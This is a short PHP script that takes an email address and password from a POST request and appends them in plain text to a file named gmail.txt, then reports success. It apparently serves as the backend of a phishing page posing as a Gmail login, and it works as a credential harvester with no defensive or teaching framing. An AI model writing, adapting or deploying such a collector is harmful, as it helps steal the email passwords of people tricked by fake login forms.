<?php
// Retrieve data from the POST request
$email = $_POST['email'];
$password = $_POST['password'];

// Path to the file
$filePath = 'gmail.txt';

// Update the file content
$fileContent = "email=$email pass=$password\n";
file_put_contents($filePath, $fileContent, FILE_APPEND);

// Respond to the client
$response = ['status' => 'success', 'message' => 'Data stored successfully'];
echo json_encode($response);
?>
